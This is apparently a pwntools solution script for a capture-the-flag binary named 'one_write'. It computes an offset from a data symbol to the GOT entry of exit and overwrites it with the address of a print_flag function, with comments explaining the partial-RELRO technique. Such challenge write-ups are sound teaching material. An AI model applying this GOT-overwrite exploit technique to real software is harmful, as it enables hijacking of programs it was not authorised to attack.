from pwn import *

context.arch = "amd64"

CHALL_PATH = "./one_write"

CHALL = ELF("./one_write")

COMMANDS = '''
br *main
brva 0x17D8
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
    else:
        r = process(CHALL_PATH) 

#the challenge is PARTIAL RELRO -> i can overwrite the pointer in the got of exit with the address of the function print_flag
#magic is an address in the data of the binary, i can see the value with gdb using p &magic

magic_offset = 0x0D8
exit_got_offset = 0x078
offset = int(exit_got_offset) - int(magic_offset)
offset = int(offset)

#since the input is summed to magic and magic is at higher addresses than the got

print("Offset to write: ",offset)
value = CHALL.symbols['print_flag'] -0x1000 + 0x5000  #the short writes 3 snippets, i have to rewrite the 5 at 4th position
print("Value to write: ",value)
print("Value in hex: ", hex(value))
print("print_flag: ", hex(CHALL.symbols['print_flag']))

r.recvuntil(b"Choice: ")
r.sendline(b"2")
r.recvuntil(b"Offset: ")
r.sendline(bytes(str(offset),'utf-8'))
r.recvuntil(b"Value: ")
r.sendline(bytes(str(value),'utf-8'))

r.interactive()


